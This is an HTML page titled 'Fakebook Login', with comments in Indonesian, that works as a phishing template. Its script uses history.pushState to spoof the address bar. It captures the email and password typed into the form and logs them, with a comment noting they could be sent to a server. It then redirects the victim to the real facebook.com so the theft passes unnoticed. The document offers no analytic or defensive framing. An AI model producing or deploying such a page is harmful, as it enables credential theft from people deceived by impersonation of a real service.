<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fakebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        input {
            margin: 10px 0;
            padding: 10px;
            width: 300px;
        }
    </style>
</head>
<body>
    <h1>Welcome to Fakebook</h1>
    <form id="loginForm">
        Email: <input type="text" name="username" placeholder="Enter email" required><br>
        Password: <input type="password" name="password" placeholder="Enter password" required>
        <button type="submit">Login</button>
    </form>

    <script>
        // Fungsi untuk mengubah URL address bar
        function spoofAddressBar() {
            // Menggunakan history.pushState untuk mengganti URL
            history.pushState(null, "", "https://fakebook.com/login");
            document.title = "Fakebook Login";  // Mengubah title untuk lebih meyakinkan
        }

        // Event listener untuk pengiriman form
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();  // Mencegah pengiriman form

            // Simulasi pengambilan data login
            var username = document.querySelector('input[name="username"]').value;
            var password = document.querySelector('input[name="password"]').value;

            // Kirim data ke server (atau bisa di-logging)
            console.log("Username: " + username + ", Password: " + password);

            // Mengubah URL setelah pengiriman
            spoofAddressBar();

            // Redirect ke halaman asli Facebook setelah 2 detik
            setTimeout(function() {
                window.location.href = "https://facebook.com";
            }, 2000);
        });

        // Panggil fungsi untuk spoof address bar saat halaman dimuat
        spoofAddressBar();
    </script>
</body>
</html>
